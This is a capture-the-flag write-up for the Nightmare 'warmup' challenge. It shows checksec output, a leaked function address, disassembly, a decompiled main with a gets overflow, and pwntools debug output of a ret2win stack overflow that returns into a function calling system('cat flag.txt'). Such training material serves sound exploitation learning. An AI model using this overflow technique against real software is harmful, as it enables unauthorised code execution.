# Soln

Note canary and PIE are disabled:

```sh
pwndbg> checksec
File:     /home/pwent/code/personal/CTF/Nightmare/pwn/warmup/warmup
Arch:     amd64
RELRO:      Partial RELRO
Stack:      No canary found
NX:         NX enabled
PIE:        No PIE (0x400000)
Stripped:   No
```

When you run the program, it leaks an address:

```sh
❯ ./warmup
-Warm Up-
WOW:0x40060d
```

Which, `nm` reports as `easy`:

```sh
❯ nm warmup | rg "60d"
000000000040060d T easy
```

`easy` calls `cat` on `flag.txt` via `system("cat flag.txt")`:

```sh
000000000040060d <easy>:
  40060d:       55                      push   rbp
  40060e:       48 89 e5                mov    rbp,rsp
  400611:       bf 34 07 40 00          mov    edi,0x400734
  400616:       e8 b5 fe ff ff          call   4004d0 <system@plt>
  40061b:       5d                      pop    rbp
  40061c:       c3``
```

Where `0x400734` is:

```sh
Contents of section .rodata:
 400730 01000200 63617420 666c6167 2e747874  ....cat flag.txt
 400740 002d5761 726d2055 702d0a00 574f573a  .-Warm Up-..WOW:
 400750 0025700a 003e00                      .%p..>.
```

Therefore, `easy` calls `system`, and PIE is disabled. We only have to redirect code exec to `easy`
to win.

`main` has a simple `gets` call that overflows `local_48`:

```c
void main(void)
{
  char local_88 [64];
  char local_48 [64];
  
  write(1,"-Warm Up-\n",10);
  write(1,&DAT_0040074c,4);
  sprintf(local_88,"%p\n",easy);
  write(1,local_88,9);
  write(1,&DAT_00400755,1);
  gets(local_48);
  return;
}
```

So we can overwrite the return address with `easy`.

```sh
❯ python soln.py
[+] Starting local process './warmup' argv=[b'./warmup'] : pid 889613
/home/pwent/code/personal/CTF/Nightmare/pwn/warmup/soln.py:8: BytesWarning: Bytes is not text; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  e = ELF(b"./warmup")
[*] '/home/pwent/code/personal/CTF/Nightmare/pwn/warmup/warmup'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    Stripped:   No
[*] Loaded 14 cached gadgets for b'./warmup'
[*] ret_addr is: 4195489
[DEBUG] Received 0x18 bytes:
    b'-Warm Up-\n'
    b'WOW:0x40060d\n'
    b'>'
[*] addr is: 4195853
/home/pwent/code/personal/CTF/Nightmare/pwn/warmup/soln.py:22: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  p.recvuntil(">")
[DEBUG] Sent 0x59 bytes:
    00000000  41 41 41 41  41 41 41 41  41 41 41 41  41 41 41 41  │AAAA│AAAA│AAAA│AAAA│
    *
    00000040  41 41 41 41  41 41 41 41  a1 04 40 00  00 00 00 00  │AAAA│AAAA│··@·│····│
    00000050  0d 06 40 00  00 00 00 00  0a                        │··@·│····│·│
    00000059
[DEBUG] Received 0xa bytes:
    b'flag{XXX}\n'
[*] Stopped process './warmup' (pid 889613)
```
